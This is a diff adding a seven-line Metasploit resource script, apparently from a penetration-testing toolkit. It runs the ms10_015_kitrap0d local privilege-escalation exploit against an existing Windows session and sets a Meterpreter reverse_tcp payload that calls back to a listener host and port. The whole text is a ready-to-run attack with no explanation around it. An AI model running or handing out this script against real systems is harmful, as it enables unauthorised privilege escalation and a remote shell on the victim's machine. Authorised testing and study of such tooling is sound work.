@@ -1,0 +1,7 @@
+# Start METERPRETER in Windows with privileges
+use exploit/windows/local/ms10_015_kitrap0d
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.1.1.100
+set LPORT 3000
+exploit
